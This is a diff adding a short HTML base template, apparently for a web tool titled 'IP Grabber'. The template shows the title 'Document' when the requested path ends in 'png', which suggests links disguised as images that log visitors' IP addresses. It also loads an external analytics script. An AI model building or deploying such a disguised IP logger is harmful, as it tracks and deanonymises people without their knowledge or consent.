@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    {% if path.endswith('png') %}
+    <title>Document</title>
+    {% else %}
+    <title>IP Grabber</title>
+    {% endif %}
+
+    <link rel='stylesheet' href='//cdn.repl.email/styles/water.css'>
+</head>
+<body>
+
+    <script src='https://code.jquery.com/jquery.min.js'></script>
+    <script src='https://analytics.dupl.repl.co/analytics.js' defer></script>
+
+    {% block content %}{% endblock %}
+    
+</body>
+</html>
